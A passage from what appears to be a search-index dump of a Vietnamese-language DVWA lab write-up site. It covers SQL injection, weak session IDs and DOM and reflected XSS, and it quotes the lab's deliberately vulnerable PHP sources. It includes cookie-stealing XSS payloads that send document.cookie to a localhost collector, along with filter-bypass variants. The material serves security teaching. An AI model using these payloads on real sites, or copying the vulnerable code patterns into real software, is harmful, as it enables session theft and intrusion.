$db -> prepare ( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data -> bindParam ( ':id' , $id , PDO :: PARAM_INT ); $data -> execute (); $row = $data -> fetch (); // Make sure only 1 result is returned if ( $data -> rowCount () == 1 ) { // Get values $first = $row [ 'first_name' ]; $last = $row [ 'last_name' ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } break ; case SQLITE : global $sqlite_db_connection ; $stmt = $sqlite_db_connection -> prepare ( 'SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $result = $stmt -> execute (); $result -> finalize (); if ( $result !== false ) { // There is no way to get the number of rows returned // This checks the number of columns (not rows) just // as a precaution, but it won't stop someone dumping // multiple rows and viewing them one at a time. $num_columns = $result -> numColumns (); if ( $num_columns == 2 ) { $row = $result -> fetchArray (); // Get values $first = $row [ 'first_name' ]; $last = $row [ 'last_name' ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } break ; } } } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Impossible"},{"location":"dvwa/sql-injection/#analysis_3","text":"","title":"Analysis"},{"location":"dvwa/sql-injection/#what-we-learned","text":"","title":"What we learned"},{"location":"dvwa/sql-injection/#more-information","text":"https://en.wikipedia.org/wiki/SQL_injection https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ https://owasp.org/www-community/attacks/SQL_Injection https://bobby-tables.com/","title":"More Information"},{"location":"dvwa/sql-injection/#see-more","text":"https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/ https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/ https://linuxhint.com/get-table-names-using-select-statement-in-mysql/ Xem t\u1ea1i https://www.php.net/manual/en/mysqli.real-escape-string.php \u21a9","title":"See more"},{"location":"dvwa/sql-injection-blind/","tags":["DVWA"],"text":"SQL Injection (Blind) \u00b6 Security Level: Low \u00b6 Source code vulnerabilities/sqli_blind/source/low.php <?php if ( isset ( $_GET [ 'Submit' ] ) ) { // Get input $id = $_GET [ 'id' ]; $exists = false ; switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ); // Removed 'or die' to suppress mysql errors $exists = false ; if ( $result !== false ) { try { $exists = ( mysqli_num_rows ( $result ) > 0 ); } catch ( Exception $e ) { $exists = false ; } } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); break ; case SQLITE : global $sqlite_db_connection ; $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; try { $results = $sqlite_db_connection -> query ( $query ); $row = $results -> fetchArray (); $exists = $row !== false ; } catch ( Exception $e ) { $exists = false ; } break ; } if ( $exists ) { // Feedback for end user echo '<pre>User ID exists in the database.</pre>' ; } else { // User wasn't found, so the page wasn't! header ( $_SERVER [ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '<pre>User ID is MISSING from the database.</pre>' ; } } ?> Analysis \u00b6 Exploition \u00b6 Security Level: Medium \u00b6 Source code Analysis \u00b6 Exploition \u00b6 Security Level: High \u00b6 Source code Analysis \u00b6 Exploition \u00b6 Security Level: Impossible \u00b6 Source code Analysis \u00b6 What we learned \u00b6 More Information \u00b6 https://en.wikipedia.org/wiki/SQL_injection http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet https://owasp.org/www-community/attacks/Blind_SQL_Injection https://bobby-tables.com/","title":"SQL Injection (Blind)"},{"location":"dvwa/sql-injection-blind/#sql-injection-blind","text":"","title":"SQL Injection (Blind)"},{"location":"dvwa/sql-injection-blind/#security-level-low","text":"Source code vulnerabilities/sqli_blind/source/low.php <?php if ( isset ( $_GET [ 'Submit' ] ) ) { // Get input $id = $_GET [ 'id' ]; $exists = false ; switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ); // Removed 'or die' to suppress mysql errors $exists = false ; if ( $result !== false ) { try { $exists = ( mysqli_num_rows ( $result ) > 0 ); } catch ( Exception $e ) { $exists = false ; } } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); break ; case SQLITE : global $sqlite_db_connection ; $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; try { $results = $sqlite_db_connection -> query ( $query ); $row = $results -> fetchArray (); $exists = $row !== false ; } catch ( Exception $e ) { $exists = false ; } break ; } if ( $exists ) { // Feedback for end user echo '<pre>User ID exists in the database.</pre>' ; } else { // User wasn't found, so the page wasn't! header ( $_SERVER [ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '<pre>User ID is MISSING from the database.</pre>' ; } } ?>","title":"Security Level: Low"},{"location":"dvwa/sql-injection-blind/#analysis","text":"","title":"Analysis"},{"location":"dvwa/sql-injection-blind/#exploition","text":"","title":"Exploition"},{"location":"dvwa/sql-injection-blind/#security-level-medium","text":"Source code","title":"Security Level: Medium"},{"location":"dvwa/sql-injection-blind/#analysis_1","text":"","title":"Analysis"},{"location":"dvwa/sql-injection-blind/#exploition_1","text":"","title":"Exploition"},{"location":"dvwa/sql-injection-blind/#security-level-high","text":"Source code","title":"Security Level: High"},{"location":"dvwa/sql-injection-blind/#analysis_2","text":"","title":"Analysis"},{"location":"dvwa/sql-injection-blind/#exploition_2","text":"","title":"Exploition"},{"location":"dvwa/sql-injection-blind/#security-level-impossible","text":"Source code","title":"Security Level: Impossible"},{"location":"dvwa/sql-injection-blind/#analysis_3","text":"","title":"Analysis"},{"location":"dvwa/sql-injection-blind/#what-we-learned","text":"","title":"What we learned"},{"location":"dvwa/sql-injection-blind/#more-information","text":"https://en.wikipedia.org/wiki/SQL_injection http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet https://owasp.org/www-community/attacks/Blind_SQL_Injection https://bobby-tables.com/","title":"More Information"},{"location":"dvwa/weak-session-ids/","tags":["DVWA","Weak Session IDs"],"text":"Weak Session IDs \u00b6 About \u00b6 Knowledge of a session ID is often the only thing required to access a site as a specific user after they have logged in, if that session ID is able to be calculated or easily guessed, then an attacker will have an easy way to gain access to user accounts without having to brute force passwords or find other vulnerabilities such as Cross-Site Scripting. Objective \u00b6 This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is generated and then infer the IDs of other system users. Security Level: Low \u00b6 Source code vulnerabilities/weak_id/source/low.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { if ( ! isset ( $_SESSION [ 'last_session_id' ])) { $_SESSION [ 'last_session_id' ] = 0 ; } $_SESSION [ 'last_session_id' ] ++ ; $cookie_value = $_SESSION [ 'last_session_id' ]; setcookie ( \"dvwaSession\" , $cookie_value ); } ?> Analysis \u00b6 Source code challenge n\u00e0y \u0111\u01a1n gi\u1ea3n r\u1ed3i, m\u1ed7i l\u1ea7n click Generate l\u00e0 1 l\u1ea7n t\u0103ng gi\u00e1 tr\u1ecb dvwaSession tr\u01b0\u1edbc l\u00ean 1 Security Level: Medium \u00b6 Source code vulnerabilities/weak_id/source/medium.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { $cookie_value = time (); setcookie ( \"dvwaSession\" , $cookie_value ); } ?> Analysis \u00b6 \u1ede challenge n\u00e0y, h\u1ecd t\u1ea1o dvwaSession b\u1eb1ng th\u1eddi gian th\u1ef1c Security Level: High \u00b6 Source code vulnerabilities/weak_id/source/high.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { if ( ! isset ( $_SESSION [ 'last_session_id_high' ])) { $_SESSION [ 'last_session_id_high' ] = 0 ; } $_SESSION [ 'last_session_id_high' ] ++ ; $cookie_value = md5 ( $_SESSION [ 'last_session_id_high' ]); setcookie ( \"dvwaSession\" , $cookie_value , time () + 3600 , \"/vulnerabilities/weak_id/\" , $_SERVER [ 'HTTP_HOST' ], false , false ); } ?> Challenge n\u00e0y, h\u1ecd k\u1ebft h\u1ee3p gi\u1eefa challenge Low v\u00e0 Medium. Security Level: Impossible \u00b6 Source code vulnerabilities/weak_id/source/impossible.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { $cookie_value = sha1 ( mt_rand () . time () . \"Impossible\" ); setcookie ( \"dvwaSession\" , $cookie_value , time () + 3600 , \"/vulnerabilities/weak_id/\" , $_SERVER [ 'HTTP_HOST' ], true , true ); } ?> Spoiler \u00b6 Low Level \u00b6 The cookie value should be very obviously predictable. Medium Level \u00b6 The value looks a little more random than on low but if you collect a few you should start to see a pattern. High Level \u00b6 First work out what format the value is in and then try to work out what is being used as the input to generate the values. Extra flags are also being added to the cookie, this does not affect the challenge but highlights extra protections that can be added to protect the cookies. Impossible Level \u00b6 The cookie value should not be predictable at this level but feel free to try. As well as the extra flags, the cookie is being tied to the domain and the path of the challenge. More Information \u00b6 Reference: WSTG - Session Management Schema Reference: OWASP Cheat Sheet - Session Management","title":"Weak Session IDs"},{"location":"dvwa/weak-session-ids/#weak-session-ids","text":"","title":"Weak Session IDs"},{"location":"dvwa/weak-session-ids/#about","text":"Knowledge of a session ID is often the only thing required to access a site as a specific user after they have logged in, if that session ID is able to be calculated or easily guessed, then an attacker will have an easy way to gain access to user accounts without having to brute force passwords or find other vulnerabilities such as Cross-Site Scripting.","title":"About"},{"location":"dvwa/weak-session-ids/#objective","text":"This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is generated and then infer the IDs of other system users.","title":"Objective"},{"location":"dvwa/weak-session-ids/#security-level-low","text":"Source code vulnerabilities/weak_id/source/low.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { if ( ! isset ( $_SESSION [ 'last_session_id' ])) { $_SESSION [ 'last_session_id' ] = 0 ; } $_SESSION [ 'last_session_id' ] ++ ; $cookie_value = $_SESSION [ 'last_session_id' ]; setcookie ( \"dvwaSession\" , $cookie_value ); } ?>","title":"Security Level: Low"},{"location":"dvwa/weak-session-ids/#analysis","text":"Source code challenge n\u00e0y \u0111\u01a1n gi\u1ea3n r\u1ed3i, m\u1ed7i l\u1ea7n click Generate l\u00e0 1 l\u1ea7n t\u0103ng gi\u00e1 tr\u1ecb dvwaSession tr\u01b0\u1edbc l\u00ean 1","title":"Analysis"},{"location":"dvwa/weak-session-ids/#security-level-medium","text":"Source code vulnerabilities/weak_id/source/medium.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { $cookie_value = time (); setcookie ( \"dvwaSession\" , $cookie_value ); } ?>","title":"Security Level: Medium"},{"location":"dvwa/weak-session-ids/#analysis_1","text":"\u1ede challenge n\u00e0y, h\u1ecd t\u1ea1o dvwaSession b\u1eb1ng th\u1eddi gian th\u1ef1c","title":"Analysis"},{"location":"dvwa/weak-session-ids/#security-level-high","text":"Source code vulnerabilities/weak_id/source/high.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { if ( ! isset ( $_SESSION [ 'last_session_id_high' ])) { $_SESSION [ 'last_session_id_high' ] = 0 ; } $_SESSION [ 'last_session_id_high' ] ++ ; $cookie_value = md5 ( $_SESSION [ 'last_session_id_high' ]); setcookie ( \"dvwaSession\" , $cookie_value , time () + 3600 , \"/vulnerabilities/weak_id/\" , $_SERVER [ 'HTTP_HOST' ], false , false ); } ?> Challenge n\u00e0y, h\u1ecd k\u1ebft h\u1ee3p gi\u1eefa challenge Low v\u00e0 Medium.","title":"Security Level: High"},{"location":"dvwa/weak-session-ids/#security-level-impossible","text":"Source code vulnerabilities/weak_id/source/impossible.php <?php $html = \"\" ; if ( $_SERVER [ 'REQUEST_METHOD' ] == \"POST\" ) { $cookie_value = sha1 ( mt_rand () . time () . \"Impossible\" ); setcookie ( \"dvwaSession\" , $cookie_value , time () + 3600 , \"/vulnerabilities/weak_id/\" , $_SERVER [ 'HTTP_HOST' ], true , true ); } ?>","title":"Security Level: Impossible"},{"location":"dvwa/weak-session-ids/#spoiler","text":"","title":"Spoiler"},{"location":"dvwa/weak-session-ids/#low-level","text":"The cookie value should be very obviously predictable.","title":"Low Level"},{"location":"dvwa/weak-session-ids/#medium-level","text":"The value looks a little more random than on low but if you collect a few you should start to see a pattern.","title":"Medium Level"},{"location":"dvwa/weak-session-ids/#high-level","text":"First work out what format the value is in and then try to work out what is being used as the input to generate the values. Extra flags are also being added to the cookie, this does not affect the challenge but highlights extra protections that can be added to protect the cookies.","title":"High Level"},{"location":"dvwa/weak-session-ids/#impossible-level","text":"The cookie value should not be predictable at this level but feel free to try. As well as the extra flags, the cookie is being tied to the domain and the path of the challenge.","title":"Impossible Level"},{"location":"dvwa/weak-session-ids/#more-information","text":"Reference: WSTG - Session Management Schema Reference: OWASP Cheat Sheet - Session Management","title":"More Information"},{"location":"dvwa/xss-dom/","tags":["DVWA","XSS","XSS DOM"],"text":"XSS (DOM) \u00b6 Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user\u2019s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: Types of Cross-Site Scripting . Objective \u00b6 Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user. Security Level: Low \u00b6 Source code vulnerabilities/xss_d/source/low.php <?php # No protections, anything goes ?> Analysis \u00b6 Challenge n\u00e0y th\u00ec \u0111\u01a1n gi\u1ea3n r\u1ed3i, kh\u00f4ng c\u00f3 r\u00e0ng bu\u1ed9c v\u1ec1 source code. B\u1ea1n ch\u1ec9 c\u1ea7n ghi nh\u1edb mu\u1ed1n l\u1ea5y cookie th\u00ec d\u00f9ng document.cookie . V\u00e0 t\u00f9y thu\u1ed9c suy ngh\u0129 c\u1ee7a b\u1ea1n v\u1ec1 v\u1ea5n \u0111\u1ec1 m\u00e0 c\u00f3 h\u01b0\u1edbng attack \u0111\u00fang \u0111\u1eafn. Thay v\u00ec ta xu\u1ea5t th\u00f4ng b\u00e1o cookie ( alert(document.cookie) ) tr\u00ean tr\u00ecnh duy\u1ec7t. Th\u00ec n\u00ean t\u1ea1o 1 website n\u00e0o \u0111\u00f3 l\u01b0u y\u00eau c\u1ea7u l\u1ea1i. V\u00ec ng\u1eef c\u1ea3nh ta \u0111\u1eb7t ra l\u00e0 cho 1 victim \"click\" v\u00e0 ta s\u1ebd ng\u1ed3i \u1edf n\u01a1i n\u00e0o \u0111\u00f3 \"quan s\u00e1t\" Exploition \u00b6 Ta c\u00f3 nhi\u1ec1u c\u00e1ch khai th\u00e1c v\u00e0 d\u01b0\u1edbi \u0111\u00e2y l\u00e0 2 c\u00e1ch khai th\u00e1c challenge n\u00e0y. document.location=\" http://localhost:8000/?abc=\"+document.cookie Security Level: Medium \u00b6 Source code vulnerabilities/xss_d/source/medium.php <?php // Is there any input? if ( array_key_exists ( \"default\" , $_GET ) && ! is_null ( $_GET [ 'default' ]) ) { $default = $_GET [ 'default' ]; # Do not allow script tags if ( stripos ( $default , \"<script\" ) !== false ) { header ( \"location: ?default=English\" ); exit ; } } ?> Analysis \u00b6 B\u00e0i n\u00e0y h\u1ecd filter \u0111\u1ea7u v\u00e0o b\u1eb1ng h\u00e0m stripos() M\u00f4 t\u1ea3 h\u00e0m stripos() Quan tr\u1ecdng h\u01a1n, n\u1ebfu \u1edf ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh kh\u00e1c th\u00ec c\u00f3 th\u1ec3 v\u1ecb tr\u00ed xu\u1ea5t hi\u1ec7n l\u00e0 0 t\u1ee9c false -> d\u1eabn \u0111\u1ebfn \u0111i\u1ec1u ki\u1ec7n if th\u1ee9 2 sai -> ta ti\u00eam \u0111\u01b0\u1ee3c <script>.... . Nh\u01b0ng v\u1edbi php th\u00ec vi\u1ec7c tr\u1ea3 v\u1ec1 0 th\u00ec kh\u00f4ng \u0111\u1ed3ng ngh\u0129a v\u1edbi false. Xem h\u00ecnh b\u00ean d\u01b0\u1edbi \u0110\u00e1ng ti\u1ebfc thay, b\u00e0i n\u00e0y d\u00f9ng double encode khum \u0111\u01b0\u1ee3c :). Ta s\u1ebd thay \u0111\u1ed5i chi\u1ebfn thu\u1eadt. Nh\u00ecn h\u00ecnh sau \u0111\u1ec3 \u0111o\u00e1n chi\u1ebfn thu\u1eadt n\u00e0o :3 Ro\u00e0i, ti\u1ebfp theo ta xem x\u00e9t ti\u1ebfp c\u1ea5u t\u1ea1o trang web V\u1edbi h\u00ecnh \u1ea3nh tr\u00ean, ta th\u1ea5y r\u1eb1ng c\u00e1c ng\u00f4n ng\u1eef l\u00e0 c\u00e1c th\u1ebb option v\u00e0 n\u1eb1m trong th\u1ebb select. Do \u0111\u00f3 \u0111\u1ec3 c\u00f3 th\u1ebb <img>. Ta c\u1ea5n tho\u00e1t th\u1ebb <select> v\u00e0 th\u1ebb <option> tr\u01b0\u1edbc. D\u00f9ng payload: \"></option></select><img src=\"image.gif\" onerror=\"alert(1)\"> Exploition \u00b6 Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch ph\u00eda tr\u00ean, b\u00e2y gi\u1edd ta ti\u1ebfn h\u00e0nh khai th\u00e1c th\u00f4i. D\u00f9ng payload: \"></option></select><img src=\"image.gif\" onerror=\"document.location='http://localhost:8000/?abc='+document.cookie\"> Ho\u1eb7c ta c\u00f3 th\u1ec3 d\u00f9ng thu\u1ed9c t\u00ednh onload c\u1ee7a th\u1ebb <svg> D\u00f9ng payload: \"></option></select><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/> Security Level: High \u00b6 Source code vulnerabilities/xss_d/source/high.php <?php // Is there any input? if ( array_key_exists ( \"default\" , $_GET ) && ! is_null ( $_GET [ 'default' ]) ) { # White list the allowable languages switch ( $_GET [ 'default' ]) { case \"French\" : case \"English\" : case \"German\" : case \"Spanish\" : # ok break ; default : header ( \"location: ?default=English\" ); exit ; } } ?> Analysis \u00b6 Ta th\u1ea5y m\u1ee9c \u0111\u1ed9 n\u00e0y h\u1ecd d\u00f9ng whitelist filter \u1edf ph\u00eda server, nh\u01b0ng c\u01a1 b\u1ea3n vi\u1ec7c XSS DOM l\u00e0 vi\u1ec7c ti\u00eam payload \u1edf client, do \u0111\u00f3 ta s\u1ebd ch\u1eb7n g\u1eedi payload c\u1ee7a m\u00ecnh l\u00ean server b\u1eb1ng \"#\". V\u00e0 \u0111\u00e2y l\u00e0 m\u00e3 ti\u00eam English#<script>document.location=' http://localhost:8000/?abc='+document.cookie </script> Exploition \u00b6 Security Level: Impossible \u00b6 Source code vulnerabilities/xss_d/source/impossible.php <?php # Don't need to do anything, protection handled on the client side ?> Analysis \u00b6 What we learned \u00b6 XSS DOM in image, svg More Information \u00b6 https://owasp.org/www-community/attacks/xss/ https://owasp.org/www-community/attacks/DOM_Based_XSS https://www.acunetix.com/blog/articles/dom-xss-explained/","title":"XSS (DOM)"},{"location":"dvwa/xss-dom/#xss-dom","text":"Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user\u2019s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: Types of Cross-Site Scripting .","title":"XSS (DOM)"},{"location":"dvwa/xss-dom/#objective","text":"Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.","title":"Objective"},{"location":"dvwa/xss-dom/#security-level-low","text":"Source code vulnerabilities/xss_d/source/low.php <?php # No protections, anything goes ?>","title":"Security Level: Low"},{"location":"dvwa/xss-dom/#analysis","text":"Challenge n\u00e0y th\u00ec \u0111\u01a1n gi\u1ea3n r\u1ed3i, kh\u00f4ng c\u00f3 r\u00e0ng bu\u1ed9c v\u1ec1 source code. B\u1ea1n ch\u1ec9 c\u1ea7n ghi nh\u1edb mu\u1ed1n l\u1ea5y cookie th\u00ec d\u00f9ng document.cookie . V\u00e0 t\u00f9y thu\u1ed9c suy ngh\u0129 c\u1ee7a b\u1ea1n v\u1ec1 v\u1ea5n \u0111\u1ec1 m\u00e0 c\u00f3 h\u01b0\u1edbng attack \u0111\u00fang \u0111\u1eafn. Thay v\u00ec ta xu\u1ea5t th\u00f4ng b\u00e1o cookie ( alert(document.cookie) ) tr\u00ean tr\u00ecnh duy\u1ec7t. Th\u00ec n\u00ean t\u1ea1o 1 website n\u00e0o \u0111\u00f3 l\u01b0u y\u00eau c\u1ea7u l\u1ea1i. V\u00ec ng\u1eef c\u1ea3nh ta \u0111\u1eb7t ra l\u00e0 cho 1 victim \"click\" v\u00e0 ta s\u1ebd ng\u1ed3i \u1edf n\u01a1i n\u00e0o \u0111\u00f3 \"quan s\u00e1t\"","title":"Analysis"},{"location":"dvwa/xss-dom/#exploition","text":"Ta c\u00f3 nhi\u1ec1u c\u00e1ch khai th\u00e1c v\u00e0 d\u01b0\u1edbi \u0111\u00e2y l\u00e0 2 c\u00e1ch khai th\u00e1c challenge n\u00e0y. document.location=\" http://localhost:8000/?abc=\"+document.cookie","title":"Exploition"},{"location":"dvwa/xss-dom/#security-level-medium","text":"Source code vulnerabilities/xss_d/source/medium.php <?php // Is there any input? if ( array_key_exists ( \"default\" , $_GET ) && ! is_null ( $_GET [ 'default' ]) ) { $default = $_GET [ 'default' ]; # Do not allow script tags if ( stripos ( $default , \"<script\" ) !== false ) { header ( \"location: ?default=English\" ); exit ; } } ?>","title":"Security Level: Medium"},{"location":"dvwa/xss-dom/#analysis_1","text":"B\u00e0i n\u00e0y h\u1ecd filter \u0111\u1ea7u v\u00e0o b\u1eb1ng h\u00e0m stripos() M\u00f4 t\u1ea3 h\u00e0m stripos() Quan tr\u1ecdng h\u01a1n, n\u1ebfu \u1edf ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh kh\u00e1c th\u00ec c\u00f3 th\u1ec3 v\u1ecb tr\u00ed xu\u1ea5t hi\u1ec7n l\u00e0 0 t\u1ee9c false -> d\u1eabn \u0111\u1ebfn \u0111i\u1ec1u ki\u1ec7n if th\u1ee9 2 sai -> ta ti\u00eam \u0111\u01b0\u1ee3c <script>.... . Nh\u01b0ng v\u1edbi php th\u00ec vi\u1ec7c tr\u1ea3 v\u1ec1 0 th\u00ec kh\u00f4ng \u0111\u1ed3ng ngh\u0129a v\u1edbi false. Xem h\u00ecnh b\u00ean d\u01b0\u1edbi \u0110\u00e1ng ti\u1ebfc thay, b\u00e0i n\u00e0y d\u00f9ng double encode khum \u0111\u01b0\u1ee3c :). Ta s\u1ebd thay \u0111\u1ed5i chi\u1ebfn thu\u1eadt. Nh\u00ecn h\u00ecnh sau \u0111\u1ec3 \u0111o\u00e1n chi\u1ebfn thu\u1eadt n\u00e0o :3 Ro\u00e0i, ti\u1ebfp theo ta xem x\u00e9t ti\u1ebfp c\u1ea5u t\u1ea1o trang web V\u1edbi h\u00ecnh \u1ea3nh tr\u00ean, ta th\u1ea5y r\u1eb1ng c\u00e1c ng\u00f4n ng\u1eef l\u00e0 c\u00e1c th\u1ebb option v\u00e0 n\u1eb1m trong th\u1ebb select. Do \u0111\u00f3 \u0111\u1ec3 c\u00f3 th\u1ebb <img>. Ta c\u1ea5n tho\u00e1t th\u1ebb <select> v\u00e0 th\u1ebb <option> tr\u01b0\u1edbc. D\u00f9ng payload: \"></option></select><img src=\"image.gif\" onerror=\"alert(1)\">","title":"Analysis"},{"location":"dvwa/xss-dom/#exploition_1","text":"Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch ph\u00eda tr\u00ean, b\u00e2y gi\u1edd ta ti\u1ebfn h\u00e0nh khai th\u00e1c th\u00f4i. D\u00f9ng payload: \"></option></select><img src=\"image.gif\" onerror=\"document.location='http://localhost:8000/?abc='+document.cookie\"> Ho\u1eb7c ta c\u00f3 th\u1ec3 d\u00f9ng thu\u1ed9c t\u00ednh onload c\u1ee7a th\u1ebb <svg> D\u00f9ng payload: \"></option></select><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/>","title":"Exploition"},{"location":"dvwa/xss-dom/#security-level-high","text":"Source code vulnerabilities/xss_d/source/high.php <?php // Is there any input? if ( array_key_exists ( \"default\" , $_GET ) && ! is_null ( $_GET [ 'default' ]) ) { # White list the allowable languages switch ( $_GET [ 'default' ]) { case \"French\" : case \"English\" : case \"German\" : case \"Spanish\" : # ok break ; default : header ( \"location: ?default=English\" ); exit ; } } ?>","title":"Security Level: High"},{"location":"dvwa/xss-dom/#analysis_2","text":"Ta th\u1ea5y m\u1ee9c \u0111\u1ed9 n\u00e0y h\u1ecd d\u00f9ng whitelist filter \u1edf ph\u00eda server, nh\u01b0ng c\u01a1 b\u1ea3n vi\u1ec7c XSS DOM l\u00e0 vi\u1ec7c ti\u00eam payload \u1edf client, do \u0111\u00f3 ta s\u1ebd ch\u1eb7n g\u1eedi payload c\u1ee7a m\u00ecnh l\u00ean server b\u1eb1ng \"#\". V\u00e0 \u0111\u00e2y l\u00e0 m\u00e3 ti\u00eam English#<script>document.location=' http://localhost:8000/?abc='+document.cookie </script>","title":"Analysis"},{"location":"dvwa/xss-dom/#exploition_2","text":"","title":"Exploition"},{"location":"dvwa/xss-dom/#security-level-impossible","text":"Source code vulnerabilities/xss_d/source/impossible.php <?php # Don't need to do anything, protection handled on the client side ?>","title":"Security Level: Impossible"},{"location":"dvwa/xss-dom/#analysis_3","text":"","title":"Analysis"},{"location":"dvwa/xss-dom/#what-we-learned","text":"XSS DOM in image, svg","title":"What we learned"},{"location":"dvwa/xss-dom/#more-information","text":"https://owasp.org/www-community/attacks/xss/ https://owasp.org/www-community/attacks/DOM_Based_XSS https://www.acunetix.com/blog/articles/dom-xss-explained/","title":"More Information"},{"location":"dvwa/xss-reflected/","tags":["DVWA","XSS","XSS Reflected"],"text":"XSS Reflected \u00b6 Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user\u2019s browser. The browser then executes the code because it came from a \u201ctrusted\u201d server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle). Objective \u00b6 One way or another, steal the cookie of a logged in user. Security Level: Low \u00b6 Source code vulnerabilities/xss_r/source/low.php <?php header ( \"X-XSS-Protection: 0\" ); // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET [ 'name' ] . '</pre>' ; } ?> Analysis \u00b6 Ta th\u1ea5y r\u1eb1ng challenge n\u00e0y d\u00f9ng ph\u01b0\u01a1ng th\u1ee9c GET \u0111\u1ec3 get name m\u00ecnh nh\u1eadp v\u00e0o. H\u01a1n n\u1eefa, n\u00f3 s\u1ebd say hello v\u1edbi m\u00ecnh v\u00e0 hi\u1ec3n th\u1ecb tr\u00ean trang web v\u00e0 \u0111\u1eb7t n\u00f3 v\u00e0o b\u00ean trong th\u1ebb <pre>. Do v\u1eady ta d\u1ec5 d\u00e0ng ch\u00e8n th\u1ebb <script> v\u00e0o v\u00e0 l\u1ea5y cookie user. Payload: <script>document.location='http://localhost:8000/?abc='+document.cookie</script> Security Level: Medium \u00b6 Source code vulnerabilities/xss_r/source/medium.php <?php header ( \"X-XSS-Protection: 0\" ); // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Get input $name = str_replace ( '<script>' , '' , $_GET [ 'name' ] ); // Feedback for end user echo \"<pre>Hello { $name } </pre>\" ; } ?> Analysis \u00b6 V\u1edbi challenge n\u00e0y, h\u1ecd ch\u1eb7n vi\u1ec7c th\u00eam th\u1ebb <script> v\u00e0o ch\u01b0\u01a1ng tr\u00ecnh. V\u00ec h\u1ecd filter c\u1ee9ng th\u1ebb <script> n\u00ean ta c\u00f3 th\u1ec3 bypass b\u1eb1ng c\u00e1ch vi\u1ebft hoa/th\u01b0\u1eddng l\u1ed9n x\u1ed9n c\u1ee7a th\u1ec3 <script> \u0111\u1ec3 bypass challenge n\u00e0y. Payload: <sCriPt>document.location='http://localhost:8000/?abc='+document.cookie</sCrIpT> Exploition \u00b6 Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch tr\u00ean, ta d\u00f9ng 